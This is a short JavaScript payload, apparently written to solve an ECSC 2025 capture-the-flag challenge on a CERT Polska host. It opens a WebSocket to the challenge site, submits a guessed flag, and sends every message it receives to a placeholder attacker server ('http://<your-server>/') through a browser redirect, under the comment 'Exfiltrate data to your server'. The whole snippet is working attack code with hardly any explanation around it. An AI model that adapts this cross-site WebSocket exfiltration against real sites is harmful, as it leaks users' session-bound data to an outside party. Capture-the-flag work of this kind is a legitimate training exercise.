let remote = "certle.ecsc25.hack.cert.pl";

// sync game state
fetch(`https://${remote}/refresh`);

setTimeout(() => {
    let ws = new WebSocket(`wss://${remote}/ws`);

    ws.onmessage = function(event) {
        // Exfiltrate data to your server
        window.location = "http://<your-server>/" + event.data;
    };

    ws.onopen = function(event){
        const data = {
           answer: "ecsc25{blablabla"
        };
        ws.send(JSON.stringify(data));
    };

}, 1000);
